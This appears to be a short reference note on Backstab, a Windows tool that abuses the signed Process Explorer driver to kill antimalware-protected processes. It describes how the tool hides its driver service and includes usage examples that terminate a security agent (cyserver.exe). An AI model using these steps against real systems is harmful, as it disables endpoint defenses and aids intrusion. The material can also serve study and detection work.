
Here is a quick rundown of what happens
1. Embedded driver is dropped to disk
2. Registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services is created
3. The privilege SE_PRIVILEGE_ENABLED is acquired because it is necessary to load the driver
4. Driver is loaded using NtLoadDriver to avoid creating a service
5. The created Registry key is deleted (service not visible during execution)
6. Communication with the driver is via using DeviceIoControl
7. For handle enumeration, NtQuerySystemInformation is called

What you should also know
1. The behavior of the tool mimics that of ProcExp. ProcExp drops the driver to the disk, create registry key under
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services, calls NtLoadDriver, and then delete the registry key
2. You can specify the location to which the driver is dropped and the service name
3. When done, the app will unload the driver. The driver is unloaded by first re-creating the registry keys and then calling NtUnloadDriver
4. The loaded driver is signed by MS
5. The process does not attempt to directly kill protected processes handles, it instructs ProcExp driver to kill them. You won't be accused of attempting to tamper with any processes

## [[Signed drivers]]
```cmd
Usage: backstab.exe <-n name || -p PID> [options]  
	-n,	Choose process by name, including the .exe suffix
	-p, 	Choose process by PID
	-l, 	List handles of protected process
	-k, 	Kill the protected process by closing its handles
	-x, 	Close a specific handle
	-d, 	Specify path to where ProcExp will be extracted
	-s, 	Specify service name registry key
	-u, 	Unload ProcExp driver
	-a,	adds SeDebugPrivilege
	-h, 	Print this menu

	Examples:
	backstab.exe -n cyserver.exe -k 			[kill cyserver]
	backstab.exe -n cyserver.exe -x E4C 		[Close handle E4C of cyserver]
	backstab.exe -n cyserver.exe -l 			[list all handles of cyserver]
	backstab.exe -p 4326 -k -d c:\\driver.sys 	[kill protected process with PID 4326, extract ProcExp driver to C:\ drive]
```


```meta
requirements: admin
results: 
oss: #win
source: https://github.com/Yaxser/Backstab
description: A tool to kill antimalware protected processes
```